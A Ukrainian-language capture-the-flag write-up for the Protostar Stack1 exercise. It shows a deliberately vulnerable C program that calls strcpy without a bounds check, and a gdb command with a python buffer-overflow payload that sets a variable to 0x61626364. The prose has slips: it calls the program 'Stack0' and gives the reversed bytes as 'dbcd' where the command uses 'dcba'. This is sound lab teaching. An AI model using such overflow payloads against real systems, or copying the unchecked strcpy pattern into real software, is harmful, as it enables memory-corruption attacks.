# STACK1

Отже, ось код для Stack0:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
Це завдання виглядає так само, як Stack0, за винятком того, що замість перевірки, чи modified  було змінено, програма перевіряє, чи ми встановили для нього шістнадцяткове значення 0x61626364.
Тут використовується функція strcpy замість функції gets, однак уразливість така сама, як і перевірка меж.

Таким чином, ми можемо вирішити це, поставивши 64 ‘a’, а потім чотири байти, що відповідають 0x61626364 (або 'abcd'). Проте слід памятати, що Кожне 4-байтове подвійне слово починається з останнього байта і працює назад.
Тож треба перевертути ці 4 байти в зворотньмому порядку 0x61626364 (або 'dbcd')

Виконаємо команду: 
```
run $(python -c "print 'a'*64 + 'dcba'")
```
Результат:

![image](https://user-images.githubusercontent.com/47494881/147470791-7174e4e4-5a85-409f-b6e5-0049ce9ec129.png)




